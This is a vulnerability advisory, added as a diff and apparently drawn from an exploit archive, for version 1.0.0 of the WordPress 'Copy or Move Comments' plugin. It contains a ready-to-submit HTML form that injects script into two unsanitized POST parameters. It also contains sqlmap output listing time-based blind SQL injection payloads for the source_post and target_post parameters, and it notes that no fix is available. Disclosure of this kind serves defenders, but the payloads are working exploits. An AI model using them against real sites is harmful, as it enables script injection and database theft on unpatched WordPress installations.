@@ -1,0 +1,66 @@
+id: 23974
+date: 08/07/2015
+title: WordPress Copy Or Move Comments 1.0.0 Cross Site Scripting Vulnerability
+author: Kenneth Jepsen
+cves: 
+
+Title: WordPress 'Copy or Move Comments' Plugin 
+Version: 1.0.0
+Author: Morten Nørtoft, Kenneth Jepsen & Mikkel Vej
+Date: 2015-06-16
+Download: 
+- https://wordpress.org/plugins/copy-or-move-comments/
+- https://plugins.svn.wordpress.org/copy-or-move-comments/
+Notified WordPress: 2015-06-21
+==========================================================
+
+## Plugin description
+==========================================================
+Using Copy/Move WordPress Plugin the admin can copy or move any comment from several types of pages to any other page!
+
+## Vulnerabilities
+==========================================================
+Two POST parameters are printed unsanitized on the plugins admin page.
+
+PoC:
+Log in as admin and submit the following form:
+<form method="POST" action="[URL]/wp-admin/admin-ajax.php"> 
+   <input type="text" name="action" value="get_all_posts" readonly><br />
+   <input type="text" name="post_type" value="'</script><script> alert(1)</script>"><br />
+   <input type="text" name="action_type" value="'</script><script> alert(2)</script>"><br />
+  <input type="submit">
+</form>
+
+Some of the SQL queries are exploitable from the admin page.
+
+SQLMAP log snippet:
+POST parameter 'source_post' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
+...
+POST parameter 'target_post' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
+sqlmap identified the following injection points with a total of 174 HTTP(s) requests:
+---
+Parameter: source_post (POST)
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)
+    Payload: option_page=copy-move-settings-group&action=update&_wpnonce=5fd9b35c58&_wp_http_referer=/projects
+/wp422/wp-admin//admin.php?page=copy-move%26error=1&copy-move=move&all_post_types=post&source_post=1 AND (SELE
+CT * FROM (SELECT(SLEEP(5)))HzuL)&move_comment_id[]=1&target_post=10&action=action_move
+
+Parameter: target_post (POST)
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)
+    Payload: option_page=copy-move-settings-group&action=update&_wpnonce=5fd9b35c58&_wp_http_referer=/projects
+/wp422/wp-admin//admin.php?page=copy-move%26error=1&copy-move=move&all_post_types=post&source_post=1&move_comm
+ent_id[]=1&target_post=10 AND (SELECT * FROM (SELECT(SLEEP(5)))kBfe)&action=action_move
+---
+
+
+
+## Solution
+==========================================================
+No fix available
+
+==========================================================
+Vulnerabilities found using Eir; an early stage static vulnerability scanner for PHP applications.
+
+#  0day.today [2023-03-23]  #
